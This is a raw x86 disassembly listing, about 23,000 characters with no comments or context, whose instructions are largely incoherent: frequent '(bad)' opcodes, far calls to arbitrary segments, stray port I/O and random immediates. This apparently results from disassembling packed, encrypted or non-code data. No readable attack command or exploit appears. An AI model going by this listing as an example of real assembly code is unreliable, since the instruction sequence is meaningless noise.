  423b8b:	pop    ds
  423b8c:	jle    0x423b70
  423b8e:	fnsave [edi-0x3a]
  423b91:	sub    BYTE PTR [eax],0x11
  423b94:	call   0xfe71:0xe835cb6e
  423b9b:	rcl    dl,1
  423b9d:	gs jle 0x423bd4
  423ba0:	in     eax,0xcc
  423ba2:	mov    ebp,0x2fb9a24c
  423ba7:	test   ecx,esp
  423ba9:	sbb    al,0xba
  423bab:	pop    esp
  423bac:	push   es
  423bad:	mov    ebx,0x3bc8dcb0
  423bb2:	xlat   BYTE PTR ds:[ebx]
  423bb3:	and    BYTE PTR [eax],al
  423bb5:	outs   dx,BYTE PTR ds:[esi]
  423bb6:	push   ds
  423bb7:	cmp    eax,0xbbc003eb
  423bbc:	and    DWORD PTR [edi],edx
  423bbe:	rdtsc  
  423bc0:	mov    eax,ds:0x808e48f7
  423bc5:	enter  0xbc8,0x1c
  423bc9:	aaa    
  423bca:	cmc    
  423bcb:	fisubr WORD PTR [ebp+edi*8-0x26]
  423bcf:	gs retf 0x7626
  423bd3:	sub    eax,DWORD PTR [edx-0x616448dc]
  423bd9:	aad    0x2
  423bdb:	rol    ebp,0x76
  423bde:	enter  0xe22b,0x9e
  423be2:	sahf   
  423be3:	aad    0x41
  423be5:	sbb    BYTE PTR [eax+ebx*1+0x5],bl
  423be9:	out    dx,al
  423bea:	xchg   DWORD PTR [ecx+0x1e],eax
  423bed:	sahf   
  423bee:	sbb    DWORD PTR [ebx],ebx
  423bf0:	cdq    
  423bf1:	add    eax,0x841387d3
  423bf6:	sar    DWORD PTR [edi+ecx*8-0x7d],1
  423bfa:	(bad)  
  423bfb:	addr16 mov edi,0x718217f5
  423c01:	lods   al,BYTE PTR ds:[esi]
  423c02:	mov    al,0xa1
  423c04:	fcomi  st,st(7)
  423c06:	add    eax,0x7355f649
  423c0b:	push   esp
  423c0c:	mov    ds:0x2364453a,al
  423c11:	xor    edx,ebx
  423c13:	dec    esi
  423c14:	jbe    0x423be4
  423c16:	shl    ebp,cl
  423c18:	clc    
  423c19:	ins    BYTE PTR es:[edi],dx
  423c1a:	stos   BYTE PTR es:[edi],al
  423c1b:	cmp    al,0x70
  423c1d:	pusha  
  423c1e:	mov    bh,0x20
  423c20:	call   0x6250:0x9464f5b2
  423c27:	stc    
  423c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c29:	jns    0x423c63
  423c2b:	popa   
  423c2c:	(bad)  
  423c2e:	jbe    0x423c77
  423c30:	icebp  
  423c31:	in     eax,dx
  423c32:	cs jg  0x423c6c
  423c35:	push   edx
  423c36:	pop    ebp
  423c37:	or     BYTE PTR [ebx-0x39],dh
  423c3a:	gs ins DWORD PTR es:[edi],dx
  423c3c:	icebp  
  423c3d:	mov    BYTE PTR [ebp+0x40423f0e],0xa9
  423c44:	dec    esi
  423c45:	jmp    0x5311:0x7058dbdd
  423c4c:	ror    DWORD PTR [esp+0x4c10ca58],cl
  423c53:	add    BYTE PTR [esi-0x487de3a1],ah
  423c59:	sub    ebx,DWORD PTR [esi+ecx*8+0x37]
  423c5d:	test   al,0x6
  423c5f:	stc    
  423c60:	call   0xe989:0x957d4849
  423c67:	ret    0x27c3
  423c6a:	xor    BYTE PTR [esi-0x5a],bl
  423c6d:	inc    ecx
  423c6e:	mov    al,0x29
  423c70:	inc    ebx
  423c71:	xchg   BYTE PTR [ebp-0x5bc31b76],cl
  423c77:	jae    0x423c7b
  423c79:	pop    ds
  423c7a:	push   es
  423c7b:	icebp  
  423c7c:	sbb    BYTE PTR [eax+eiz*1-0x57b6baa8],bh
  423c83:	dec    ebp
  423c84:	mov    bl,0xb0
  423c86:	add    BYTE PTR [ebx],bh
  423c88:	pop    ecx
  423c89:	lods   eax,DWORD PTR ds:[esi]
  423c8a:	push   ecx
  423c8b:	popf   
  423c8c:	mov    ebx,DWORD PTR ds:0xc2d7c194
  423c92:	test   DWORD PTR ds:0xa430bf75,ebp
  423c98:	mov    ah,0x83
  423c9a:	mov    bh,0x87
  423c9c:	inc    ecx
  423c9d:	push   cs
  423c9e:	lea    esp,[esi]
  423ca0:	lahf   
  423ca1:	imul   esp,DWORD PTR [ebx+0x458b82b1],0xad2bb9b8
  423cab:	call   0x840d:0xc9e2bcc1
  423cb2:	or     al,BYTE PTR [ecx]
  423cb4:	(bad)  
  423cb5:	mov    eax,0xcc9f5a86
  423cba:	xchg   ecx,eax
  423cbb:	das    
  423cbc:	enter  0x4c85,0xf5
  423cc0:	imul   eax,DWORD PTR [edx],0xffffff86
  423cc3:	pop    edx
  423cc5:	mov    edx,0xae758f3e
  423cca:	loopne 0x423c70
  423ccc:	fdiv   QWORD PTR [esi-0x45]
  423ccf:	adc    BYTE PTR [ecx],bh
  423cd1:	cmc    
  423cd2:	sub    DWORD PTR [ebx+0x48],0x39141d37
  423cd9:	ret    0xa3dd
  423cdc:	sti    
  423cdd:	popf   
  423cde:	aas    
  423cdf:	pop    edi
  423ce0:	jbe    0x423d22
  423ce2:	sbb    al,0xa6
  423ce4:	mov    dh,0xf9
  423ce6:	mov    DWORD PTR [eax+0x33457d1b],esp
  423cec:	mov    ch,0xe8
  423cee:	test   eax,0x600f6503
  423cf3:	pop    edi
  423cf4:	in     al,0xc8
  423cf6:	pop    edi
  423cf7:	push   esp
  423cf9:	in     al,dx
  423cfa:	mov    dh,BYTE PTR [ecx]
  423cfc:	push   esp
  423cfd:	imul   eax,DWORD PTR [ebp+0x706779e5],0xffffffd9
  423d04:	fisub  DWORD PTR [eax]
  423d06:	into   
  423d07:	je     0x423d28
  423d09:	sub    dh,BYTE PTR [eax+eiz*4+0x666db69]
  423d10:	jecxz  0x423d2b
  423d12:	(bad)  
  423d14:	sub    dh,ch
  423d16:	sti    
  423d17:	cmp    ebx,DWORD PTR [esi+ecx*8+0x20]
  423d1b:	mov    cl,0x17
  423d1d:	aaa    
  423d1e:	lahf   
  423d1f:	or     edx,DWORD PTR [eax+0x63]
  423d22:	inc    edi
  423d23:	inc    BYTE PTR [ecx+eax*1]
  423d26:	aad    0x50
  423d28:	aas    
  423d29:	jp     0x423d42
  423d2b:	xchg   edx,eax
  423d2c:	sbb    eax,0xf9c81bff
  423d31:	xchg   edx,eax
  423d32:	jl     0x423d5b
  423d34:	shl    BYTE PTR [ebp-0x48],cl
  423d37:	mov    ebx,0x7bcd43e6
  423d3c:	push   esi
  423d3d:	(bad)  
  423d3e:	push   eax
  423d3f:	add    cl,al
  423d41:	and    DWORD PTR [ebp+esi*1-0x7c],ecx
  423d45:	push   ss
  423d46:	mov    esp,0x451774bd
  423d4b:	sahf   
  423d4c:	xor    eax,0xa81f29d9
  423d51:	push   edx
  423d52:	in     eax,dx
  423d53:	test   al,0x2c
  423d55:	xchg   edx,eax
  423d56:	mov    ebx,0x9d86e380
  423d5b:	lea    ecx,[esi-0x45cb2301]
  423d61:	inc    edx
  423d62:	push   ebp
  423d63:	(bad)  
  423d64:	xchg   esi,eax
  423d65:	xor    edi,esi
  423d67:	sub    BYTE PTR [ecx],dl
  423d69:	push   ebx
  423d6a:	and    esi,ebx
  423d6c:	sahf   
  423d6d:	push   ebx
  423d6e:	and    ebx,DWORD PTR [eax-0x357e9c73]
  423d74:	jge    0x423de0
  423d76:	jae    0x423d6f
  423d78:	daa    
  423d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d7a:	int3   
  423d7b:	add    BYTE PTR [ebx+0x3],0x73
  423d7f:	popf   
  423d80:	sbb    BYTE PTR [eax-0x40],dh
  423d83:	icebp  
  423d84:	stos   DWORD PTR es:[edi],eax
  423d85:	sbb    DWORD PTR [edi],0x10
  423d88:	loopne 0x423d55
  423d8a:	mov    ds:0x95ac4966,eax
  423d8f:	call   0xc0d583e7
  423d94:	cmp    DWORD PTR [ecx-0x4f],0x6ce5ae25
  423d9b:	lahf   
  423d9c:	or     cl,al
  423d9e:	hlt    
  423d9f:	(bad)  
  423da1:	mov    ebx,0xaf32693b
  423da6:	jmp    0x423def
  423da8:	fsub   DWORD PTR [esi+0x72]
  423dab:	in     eax,dx
  423dac:	xchg   edi,edi
  423dae:	daa    
  423daf:	mov    ds:0x5d0f0a06,eax
  423db4:	(bad)  
  423db5:	mov    ebp,0x4c67a124
  423dba:	add    eax,DWORD PTR [ebx]
  423dbc:	jbe    0x423e31
  423dbe:	bound  edx,QWORD PTR ds:[edi-0x10d8b8a4]
  423dc5:	ret    
  423dc6:	aam    0x1c
  423dc8:	jmp    0xb22174bc
  423dcd:	fisttp QWORD PTR [esi+ebp*2-0x3794ff3a]
  423dd4:	mov    ebx,0x82203f9e
  423dd9:	inc    esi
  423dda:	xor    al,0xe
  423ddc:	cmp    eax,0x525cc5a2
  423de1:	sbb    eax,0x17b1b689
  423de6:	lds    eax,FWORD PTR [ebx]
  423de8:	sub    edx,DWORD PTR [ebp-0x607faf5b]
  423dee:	jb     0x423dda
  423df0:	js     0x423e52
  423df2:	mov    ?,ecx
  423df4:	add    BYTE PTR [eax+ebp*8],0xc2
  423df8:	loop   0x423e0d
  423dfa:	push   edx
  423dfb:	pop    edx
  423dfc:	mov    edx,0x9e8ffe40
  423e01:	push   eax
  423e02:	call   0x8c0633b3
  423e07:	mov    ds:0xc3b70aaf,al
  423e0c:	pop    ds
  423e0d:	popa   
  423e0e:	cmp    DWORD PTR [ebp+0x9859b82],edx
  423e14:	push   0xffffffa9
  423e16:	xchg   DWORD PTR [ebx],ebp
  423e18:	mov    ch,0x87
  423e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e1b:	jmp    0x423e6f
  423e1d:	mov    ch,0xe2
  423e1f:	inc    ecx
  423e20:	jmp    0x24eb:0xb8a3acff
  423e27:	lock sub al,0xd1
  423e2a:	xor    esp,ebp
  423e2c:	out    0x6a,eax
  423e2e:	in     eax,dx
  423e2f:	dec    ebx
  423e30:	fs add DWORD PTR ss:[edi+0x71fec25e],ebp
  423e38:	jmp    0x423e55
  423e3a:	sti    
  423e3b:	push   ecx
  423e3c:	dec    esi
  423e3d:	and    DWORD PTR [esi-0x33],ebp
  423e40:	xlat   BYTE PTR ds:[ebx]
  423e41:	jmp    0x423df6
  423e43:	or     eax,0xe83c1855
  423e48:	(bad)  
  423e49:	mov    bh,0x29
  423e4b:	in     al,0x4d
  423e4d:	ror    BYTE PTR [edi+ecx*1+0x66db233c],0x51
  423e55:	inc    eax
  423e56:	jns    0x423ea7
  423e58:	data16 clc 
  423e5a:	adc    al,0x85
  423e5c:	or     eax,0x71adf0f1
  423e61:	out    dx,al
  423e62:	(bad)  
  423e63:	out    dx,eax
  423e64:	jp     0x423e2e
  423e66:	cmp    eax,0xf726ff3e
  423e6b:	dec    edx
  423e6c:	call   0x688b:0x3eaba79e
  423e73:	inc    eax
  423e74:	(bad)  
  423e75:	retf   0xc0a3
  423e78:	data16 setge BYTE PTR [ebx]
  423e7c:	scas   eax,DWORD PTR es:[edi]
  423e7d:	pop    ebp
  423e7e:	jnp    0x423eea
  423e80:	cwde   
  423e81:	jo     0x423e04
  423e83:	jl     0x423eaf
  423e85:	jp     0x423e2f
  423e87:	sti    
  423e88:	jo     0x423ea5
  423e8a:	mov    DWORD PTR [edx],0x7473219b
  423e90:	cmp    BYTE PTR [ebx],al
  423e92:	adc    ecx,ecx
  423e94:	cmp    BYTE PTR [ebx],cl
  423e96:	jmp    esi
  423e98:	ds es sbb eax,0xdcd1579f
  423e9f:	aaa    
  423ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ea1:	xchg   esi,eax
  423ea2:	div    BYTE PTR [esi+eiz*8+0x42]
  423ea6:	or     edx,edi
  423ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ea9:	mov    al,0xc4
  423eab:	xchg   edi,eax
  423eac:	jge    0x423e72
  423eae:	xchg   esi,eax
  423eaf:	push   esp
  423eb0:	outs   dx,BYTE PTR ds:[esi]
  423eb1:	out    0xdb,eax
  423eb3:	je     0x423e97
  423eb5:	xchg   ebp,eax
  423eb6:	popf   
  423eb7:	rcl    DWORD PTR [edi],1
  423eb9:	shl    bl,1
  423ebb:	pop    ebx
  423ebc:	dec    ebx
  423ebd:	(bad)  
  423ebe:	enter  0xb8f9,0x6f
  423ec2:	loopne 0x423ebf
  423ec4:	mov    edx,0x5ba6b013
  423ec9:	xor    al,0x50
  423ecb:	push   0xffffff8b
  423ecd:	test   BYTE PTR [ecx],al
  423ecf:	mov    bh,0x56
  423ed1:	mov    edi,0x97e28e18
  423ed6:	jecxz  0x423e95
  423ed8:	or     ebx,DWORD PTR [edi]
  423eda:	out    0x55,eax
  423edc:	jmp    0x423f3d
  423ede:	and    ch,BYTE PTR [edx+esi*1+0x1]
  423ee2:	imul   esp,DWORD PTR [ecx+0x2f],0xffffff8d
  423ee6:	sbb    eax,0xc0ff7ae1
  423eeb:	add    DWORD PTR [ecx+0xfd81fc1],edi
  423ef1:	out    dx,al
  423ef2:	call   0x713c:0xad4177c8
  423ef9:	repnz cmp BYTE PTR [esi],0x58
  423efd:	sbb    al,0x4d
  423eff:	retf   0x3599
  423f02:	mov    ?,WORD PTR [ecx]
  423f04:	xchg   esp,eax
  423f05:	mov    cl,0xd
  423f07:	mov    BYTE PTR ds:0x1f6e4aa9,ch
  423f0d:	jmp    0x614f:0x2922e60c
  423f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f15:	sub    ebp,esp
  423f17:	or     al,cl
  423f19:	xchg   esi,eax
  423f1a:	out    0xc1,eax
  423f1c:	icebp  
  423f1d:	bound  ebx,QWORD PTR [edi+edx*4+0x75b482ca]
  423f24:	mov    bl,0x2f
  423f26:	sub    al,BYTE PTR [ecx]
  423f28:	ror    BYTE PTR [ecx+0x46],1
  423f2b:	scas   eax,DWORD PTR es:[edi]
  423f2c:	js     0x423f6d
  423f2e:	xor    eax,0xbdeb6e40
  423f33:	push   esi
  423f34:	inc    esi
  423f35:	(bad)  
  423f36:	stc    
  423f37:	fld    TBYTE PTR [ecx-0x12]
  423f3a:	adc    ebp,ecx
  423f3c:	test   al,0x5b
  423f3e:	mov    dh,cl
  423f40:	or     BYTE PTR [ecx],cl
  423f42:	sub    dl,BYTE PTR [edx+ebp*2]
  423f45:	loope  0x423f62
  423f47:	sti    
  423f48:	aas    
  423f49:	std    
  423f4a:	pop    ss
  423f4b:	int3   
  423f4c:	push   0xaae95e8e
  423f51:	inc    edi
  423f52:	add    ecx,DWORD PTR [ecx]
  423f54:	rcr    DWORD PTR [eax],1
  423f56:	push   es
  423f57:	(bad)  
  423f58:	and    eax,0xe488f2b8
  423f5d:	ds pop edi
  423f5f:	inc    eax
  423f60:	test   al,0xc7
  423f62:	fistp  QWORD PTR [edi-0x5a9ac8b4]
  423f68:	fisubr WORD PTR [edx-0x366e97e6]
  423f6e:	adc    ah,BYTE PTR [edi*2+0x74928d5e]
  423f75:	in     eax,dx
  423f76:	dec    edi
  423f77:	stos   DWORD PTR es:[edi],eax
  423f78:	adc    bl,BYTE PTR [ebp-0x6416a941]
  423f7e:	je     0x423fe7
  423f80:	ins    DWORD PTR es:[edi],dx
  423f81:	repz mov dh,0x15
  423f84:	jge    0x423fec
  423f86:	int    0xea
  423f88:	sub    al,BYTE PTR [edi]
  423f8a:	and    al,0xe0
  423f8c:	mov    ds:0x45438341,eax
  423f91:	xor    BYTE PTR [edi-0x3],dl
  423f94:	mov    esp,0xd835120d
  423f9a:	and    BYTE PTR [esi+0x3167de2],dl
  423fa0:	(bad)  
  423fa1:	(bad)  
  423fa2:	test   DWORD PTR [ecx],0x573774f1
  423fa8:	xor    dl,BYTE PTR [eax]
  423faa:	jno    0x423fc0
  423fac:	fdivr  DWORD PTR [edi-0x2ecb76ed]
  423fb2:	rol    BYTE PTR [ebp-0x2aeaa3b0],1
  423fb8:	inc    ecx
  423fb9:	sbb    al,0x3f
  423fbb:	jbe    0x424010
  423fbd:	inc    esp
  423fbe:	jae    0x42402d
  423fc0:	lods   eax,DWORD PTR ds:[esi]
  423fc1:	add    eax,0x9152aab7
  423fc6:	scas   eax,DWORD PTR es:[edi]
  423fc7:	mov    eax,ds:0xaeee86a7
  423fcc:	jmp    0x423f88
  423fce:	aaa    
  423fcf:	adc    DWORD PTR [ecx],edx
  423fd1:	call   0x29881e2d
  423fd6:	pop    esp
  423fd7:	iret   
  423fd8:	(bad)  
  423fd9:	fucomp st(1)
  423fdb:	das    
  423fdc:	dec    esi
  423fdd:	sbb    DWORD PTR [ebx],edx
  423fdf:	call   0xb0f:0x59434665
  423fe6:	test   al,0x3c
  423fe8:	nop
  423fe9:	adc    BYTE PTR [edx],ah
  423feb:	add    BYTE PTR [edi],dl
  423fed:	xchg   DWORD PTR [ecx-0x2c],ebx
  423ff0:	loop   0x423fcc
  423ff2:	inc    edx
  423ff3:	add    al,BYTE PTR [ebx+ebp*8+0x52e2b49b]
  423ffa:	sbb    ecx,DWORD PTR [edi]
  423ffc:	jge    0x424015
  423ffe:	(bad)  
  424000:	(bad)  [edi+eax*1+0x6a]
  424004:	scas   al,BYTE PTR es:[edi]
  424005:	add    bh,BYTE PTR [esi+0x6e]
  424008:	push   edi
  424009:	mov    esp,0x814918a8
  42400e:	in     eax,dx
  42400f:	aas    
  424010:	dec    ecx
  424011:	ins    DWORD PTR es:[edi],dx
  424012:	mov    esp,0xc3160b15
  424017:	mov    ah,0x92
  424019:	cmp    al,0x67
  42401b:	dec    edx
  42401c:	clc    
  42401d:	retf   0xaee
  424020:	sub    al,0xe3
  424022:	ret    0x733f
  424025:	dec    ebp
  424026:	ret    0x63ea
  424029:	pop    es
  42402a:	add    BYTE PTR [edi+ebp*4-0x6],bh
  42402e:	mov    cl,0xc4
  424030:	dec    ebp
  424031:	mov    ebp,0x5ebc1a9
  424036:	xchg   esi,eax
  424037:	adc    bh,dl
  424039:	sub    eax,0xa40557ff
  42403e:	fld    st(2)
  424040:	inc    ebx
  424041:	mov    esp,0x895fc644
  424046:	and    cl,BYTE PTR [edi+0x3e5abef]
  42404c:	in     eax,dx
  42404d:	add    ch,0x4e
  424050:	jg     0x42402d
  424052:	sbb    ah,BYTE PTR [edi-0x168d609f]
  424058:	mov    dl,BYTE PTR [ebx-0x46]
  42405b:	nop
  42405c:	jecxz  0x4240cb
  42405e:	call   0x52fb:0x4bb99311
  424065:	stos   BYTE PTR es:[edi],al
  424066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424067:	outs   dx,DWORD PTR ds:[esi]
  424068:	jp     0x424052
  42406a:	in     eax,0x21
  42406c:	(bad)  
  42406d:	cld    
  42406e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42406f:	es call 0xe65c7bcd
  424075:	xchg   ecx,eax
  424076:	sub    esi,edx
  424078:	mov    ch,0x9
  42407a:	jmp    0x4b31:0xccab8434
  424081:	sbb    DWORD PTR [ebx+ecx*2],edx
  424084:	popa   
  424085:	mov    esi,0x61f08d49
  42408a:	rcl    BYTE PTR [edx+ebx*4+0x41],cl
  42408e:	xor    eax,0x2ce2e1ae
  424093:	pushf  
  424094:	shr    DWORD PTR [esi+0x3708c70c],cl
  42409a:	jle    0x4240fa
  42409c:	inc    esp
  42409d:	mov    esp,0xfe490c82
  4240a2:	ror    DWORD PTR [edx+ebx*4+0x4611dbfe],cl
  4240a9:	sti    
  4240aa:	mov    bh,0x99
  4240ac:	ja     0x424036
  4240ae:	ja     0x42412b
  4240b0:	lds    esi,FWORD PTR ds:0x7eb682ec
  4240b6:	stos   DWORD PTR es:[edi],eax
  4240b7:	xchg   ecx,eax
  4240b8:	jecxz  0x424085
  4240ba:	out    dx,al
  4240bb:	sub    dl,BYTE PTR [esi+ebx*2+0x23]
  4240bf:	in     eax,0x77
  4240c1:	mov    al,ds:0x215ba80d
  4240c6:	xor    dl,BYTE PTR [ebx-0x8ff50b5]
  4240cc:	or     DWORD PTR [eax-0x7ac68ab],esp
  4240d2:	mov    edi,0x8bfb7c39
  4240d7:	outs   dx,BYTE PTR ds:[esi]
  4240d8:	sub    BYTE PTR [esi],ah
  4240da:	inc    ecx
  4240db:	mov    WORD PTR [eax+0x30bcaca5],gs
  4240e1:	mov    ds:0xd68d576a,al
  4240e6:	cmp    ecx,DWORD PTR [edx+0x24]
  4240e9:	(bad)  
  4240ea:	loopne 0x42406d
  4240ec:	pusha  
  4240ed:	std    
  4240ee:	icebp  
  4240ef:	sub    al,0x18
  4240f1:	xchg   ebp,eax
  4240f2:	pop    edx
  4240f3:	ret    
  4240f4:	fsubr  DWORD PTR [ebx-0x1e]
  4240f7:	scas   eax,DWORD PTR es:[edi]
  4240f8:	cmp    eax,DWORD PTR [edx+0x76]
  4240fb:	out    dx,al
  4240fc:	or     ch,BYTE PTR [eax+0x12e97aa6]
  424102:	mov    dl,0xb2
  424104:	inc    ebp
  424105:	sub    esp,DWORD PTR [esi-0x3903aa4e]
  42410b:	ds loop 0x424099
  42410e:	stc    
  42410f:	es pop ebp
  424111:	inc    ebx
  424112:	or     eax,0x9b5c7184
  424117:	jmp    0xc22:0x23c5d0fd
  42411e:	adc    al,0xe5
  424120:	ja     0x424106
  424122:	fmul   DWORD PTR [edi+0x409c2bdd]
  424128:	outs   dx,DWORD PTR ds:[esi]
  424129:	test   al,0xde
  42412b:	(bad)  
  42412c:	push   ebx
  42412d:	jge    0x4240b0
  42412f:	leave  
  424130:	add    BYTE PTR [eax-0x73],bl
  424133:	fbstp  TBYTE PTR [esi-0x45]
  424136:	cwde   
  424137:	hlt    
  424138:	clc    
  424139:	xchg   edi,eax
  42413a:	jmp    0x222d026e
  42413f:	sbb    eax,0x820185d3
  424144:	pop    esp
  424145:	call   0x9d56b361
  42414a:	push   ss
  42414b:	adc    BYTE PTR [ecx],cl
  42414d:	out    dx,al
  42414e:	sti    
  42414f:	outs   dx,BYTE PTR ds:[esi]
  424150:	das    
  424151:	pushf  
  424152:	lock ds popa 
  424155:	push   ebx
  424156:	into   
  424157:	mov    ds:0xc5d5f1d,al
  42415c:	inc    ebx
  42415d:	rcr    BYTE PTR [eax],cl
  42415f:	mov    ds:0x53a889a4,eax
  424164:	fs rol dl,cl
  424167:	sbb    esi,DWORD PTR [esi+esi*8]
  42416a:	push   eax
  42416b:	jmp    0x4241a8
  42416d:	pop    ecx
  42416e:	pop    es
  42416f:	shl    BYTE PTR [edi],1
  424171:	jne    0x424189
  424173:	fnstcw WORD PTR [eax+0x6beb416d]
  424179:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42417b:	std    
  42417c:	sti    
  42417d:	icebp  
  42417e:	xchg   DWORD PTR [ebx],ebx
  424180:	popf   
  424181:	aad    0x15
  424183:	xchg   ebp,eax
  424184:	out    0xd0,eax
  424186:	mov    ecx,0xa67a85b1
  42418b:	out    dx,al
  42418c:	sub    DWORD PTR [esi-0x3cae1b11],esp
  424192:	mov    eax,cs:0x49da41ef
  424198:	js     0x424190
  42419a:	xchg   ecx,eax
  42419b:	xor    DWORD PTR [esi+eax*2],ebx
  42419e:	stc    
  42419f:	jecxz  0x4241fb
  4241a1:	add    al,0xf1
  4241a4:	fucomip st,st(3)
  4241a6:	mov    edx,0x492648ef
  4241ab:	mov    bl,0x22
  4241ad:	int3   
  4241ae:	cmp    ecx,DWORD PTR [ecx+edx*8-0x374c0390]
  4241b5:	scas   al,BYTE PTR es:[edi]
  4241b6:	mov    dh,dl
  4241b8:	repz cmp al,0x14
  4241bb:	loop   0x4241b0
  4241bd:	mov    dl,bh
  4241bf:	ficom  WORD PTR [eax]
  4241c1:	retf   
  4241c2:	push   ecx
  4241c3:	js     0x424194
  4241c5:	sub    al,0x82
  4241c7:	aam    0x75
  4241c9:	lds    edx,FWORD PTR [edx+0x363a0866]
  4241cf:	jae    0x424236
  4241d1:	into   
  4241d2:	and    DWORD PTR ds:0xc7873a9b,esp
  4241d8:	inc    ecx
  4241d9:	bnd data16 jp 0x4241fb
  4241dd:	popa   
  4241de:	mov    dh,BYTE PTR [edi+0x13]
  4241e1:	sub    DWORD PTR [eax-0xd],esi
  4241e4:	dec    eax
  4241e5:	das    
  4241e6:	push   es
  4241e7:	jno    0x4241e3
  4241e9:	or     al,0x25
  4241ec:	push   ebx
  4241ed:	push   edi
  4241ee:	out    dx,al
  4241ef:	clc    
  4241f0:	jecxz  0x4241ea
  4241f2:	ins    BYTE PTR es:[edi],dx
  4241f3:	mov    ecx,0x74dde601
  4241f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241f9:	mov    bl,0x80
  4241fc:	daa    
  4241fd:	push   ebx
  4241fe:	pop    ecx
  4241ff:	pushf  
  424200:	xor    BYTE PTR [eax+0x2395552d],al
  424206:	lock test al,0xdf
  424209:	rcr    BYTE PTR [ebx-0x42],cl
  42420c:	jmp    0x1459:0xa8f8d876
  424213:	xor    al,ch
  424215:	aaa    
  424216:	or     cl,ah
  424218:	retf   
  424219:	ret    
  42421a:	lods   eax,DWORD PTR ds:[esi]
  42421b:	ror    DWORD PTR [ecx+0x4bc7fcda],cl
  424221:	mov    esp,?
  424223:	aaa    
  424224:	lods   al,BYTE PTR ds:[esi]
  424225:	mov    bh,0x60
  424227:	adc    DWORD PTR fs:[ecx-0x3efdec1a],edx
  42422e:	mov    ah,BYTE PTR [ebp-0x13e136f4]
  424234:	mov    bl,0x44
  424236:	mov    ebp,0x611f7c45
  42423b:	cwde   
  42423c:	push   ds
  42423d:	pop    ebx
  42423e:	push   es
  42423f:	mov    BYTE PTR [ebx-0x28],al
  424242:	sub    al,ch
  424244:	add    ebp,DWORD PTR [edi+0x1]
  424247:	adc    DWORD PTR [ebx],ebx
  424249:	ror    BYTE PTR [edi-0x266d6257],cl
  42424f:	iret   
  424250:	imul   BYTE PTR [edi-0x502fc18d]
  424256:	and    eax,DWORD PTR [edx+0x56d66dc7]
  42425c:	or     al,0x64
  42425e:	fsub   DWORD PTR [edx+0x3009927e]
  424264:	cs daa 
  424266:	push   edx
  424267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424268:	or     eax,0x650b9dde
  42426d:	aaa    
  42426e:	loop   0x4242d1
  424270:	pop    esp
  424271:	dec    esp
  424272:	out    0xb7,eax
  424274:	call   0xb7088bec
  424279:	jmp    FWORD PTR [esi+0x442b11b0]
  42427f:	or     ecx,esi
  424281:	inc    ebp
  424282:	pop    ebx
  424283:	jno    0x424215
  424285:	lea    edi,[ecx+0x6a]
  424288:	mov    ebx,DWORD PTR [esi-0x61b8a588]
  42428e:	xchg   ebx,eax
  42428f:	fwait
  424290:	cdq    
  424291:	jmp    0x7f8e8ceb
  424296:	mov    ecx,0xf7e00eb7
  42429b:	push   esi
  42429c:	push   eax
  42429d:	dec    ebx
  42429e:	mov    esp,0xaa045af3
  4242a3:	sti    
  4242a4:	push   es
  4242a5:	pop    es
  4242a6:	aaa    
  4242a7:	arpl   WORD PTR [ebx],di
  4242a9:	cmp    DWORD PTR [edi],esp
  4242ab:	ret    
  4242ac:	xor    al,0x5d
  4242ae:	arpl   WORD PTR [edx],ax
  4242b0:	pop    edi
  4242b1:	add    edx,eax
  4242b3:	add    bh,BYTE PTR [esi-0x1886c24e]
  4242b9:	pusha  
  4242ba:	push   ss
  4242bb:	mov    esi,0xd5517481
  4242c0:	rcr    DWORD PTR [esi],0x8e
  4242c3:	sbb    ah,ah
  4242c5:	xor    ecx,DWORD PTR [ebp+0x24543ee5]
  4242cb:	sub    eax,0x57722905
  4242d0:	add    ecx,DWORD PTR [edi+edx*1+0x29]
  4242d4:	mov    ch,0x84
  4242d6:	xor    DWORD PTR [eax+0x253f7785],esi
  4242dc:	dec    esi
  4242dd:	lock adc BYTE PTR [edx+0x45bf571a],bh
  4242e4:	fs aam 0x93
  4242e7:	ror    DWORD PTR [edi],cl
  4242e9:	rcr    BYTE PTR [ebx],0xbd
  4242ec:	pop    ecx
  4242ed:	or     eax,0x2f9caf07
  4242f2:	in     eax,dx
  4242f3:	push   ebx
  4242f4:	sub    edx,DWORD PTR [edx+edx*2+0x7f]
  4242f8:	iret   
  4242f9:	adc    ebp,eax
  4242fb:	clc    
  4242fc:	cld    
  4242fd:	mov    BYTE PTR cs:[ebx*2-0x7695fca2],ch
  424305:	(bad)  
  424306:	pop    eax
  424307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424308:	lds    esi,FWORD PTR [esi]
  42430a:	push   ss
  42430b:	shr    DWORD PTR [eax],cl
  42430d:	adc    ch,BYTE PTR [esi-0x3245f4e2]
  424313:	iret   
  424314:	push   0xf905052b
  424319:	jns    0x4242bf
  42431b:	inc    ebx
  42431c:	call   0xaca:0x7981b6bf
  424323:	push   es
  424324:	std    
  424325:	xchg   esp,eax
  424326:	xchg   BYTE PTR [edx],bl
  424328:	or     BYTE PTR [edx],ah
  42432a:	xlat   BYTE PTR ds:[ebx]
  42432b:	pop    ss
  42432c:	out    0xd2,al
  42432e:	les    eax,FWORD PTR [ebx+0x71]
  424331:	pushf  
  424332:	sbb    eax,0xba90cad0
  424337:	cdq    
  424338:	push   esp
  424339:	leave  
  42433a:	add    al,0xe9
  42433c:	lods   eax,DWORD PTR ds:[esi]
  42433d:	test   DWORD PTR [esi],edx
  42433f:	sbb    ebp,DWORD PTR ds:[edx+0x58015fd3]
  424346:	add    esp,DWORD PTR es:[ebx+0x3ee2aebb]
  42434d:	cmp    al,0x35
  42434f:	jl     0x424330
  424351:	imul   ebp,DWORD PTR [eax-0x65ec71c3],0x137fb71c
  42435b:	enter  0x550,0xec
  42435f:	int    0xbc
  424361:	iret   
  424362:	imul   esp,DWORD PTR [esi+0x62],0x8a66f614
  424369:	xchg   esi,eax
  42436a:	dec    esi
  42436b:	cmc    
